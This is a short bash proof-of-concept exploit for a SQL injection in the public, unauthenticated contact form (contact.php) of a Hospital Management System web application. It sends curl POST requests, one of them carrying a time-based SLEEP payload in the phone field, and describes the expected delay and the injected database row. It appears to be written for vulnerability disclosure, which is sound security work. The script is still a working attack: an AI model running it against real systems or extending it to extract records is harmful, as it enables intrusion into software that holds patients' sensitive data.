#!/usr/bin/env bash
# Hospital-Management-System Contact Form INSERT SQL Injection - PoC
# Package: hms-contact-insert-sqli (HMS-06, contact.php:5-11)
# Target: POST /contact.php (public page, no authentication)
# Usage: ./poc.sh http://<target-host>[:port]
# Harmless payload: SLEEP time oracle via VALUES rewrite; no data extraction.

BASE="${1:-http://localhost:8000}"

echo "[*] Baseline contact submission"
curl -s -o /dev/null -w '    status=%{http_code} time=%{time_total}s\n' -X POST "$BASE/contact.php" \
  --data-urlencode "btnSubmit=1" \
  --data-urlencode "txtName=Night" \
  --data-urlencode "txtEmail=night@test.local" \
  --data-urlencode "txtPhone=1234567890" \
  --data-urlencode "txtMsg=hello"
# expect: ~0.03 s; row: Night | night@test.local | 1234567890 | hello

echo "[*] INSERT injection: txtPhone = x',(SELECT SLEEP(5)))-- -"
curl -s -o /dev/null -w '    status=%{http_code} time=%{time_total}s\n' -X POST "$BASE/contact.php" \
  --data-urlencode "btnSubmit=1" \
  --data-urlencode "txtName=Night" \
  --data-urlencode "txtEmail=night@test.local" \
  --data-urlencode "txtPhone=x',(SELECT SLEEP(5)))-- -" \
  --data-urlencode "txtMsg=hello"
# expect: ~5 s delay
# stored-row proof (query the DB):
#   SELECT * FROM contact WHERE email='night@test.local';
#   -> injected row: contact='x', message='0'   (0 = SLEEP(5) return value)
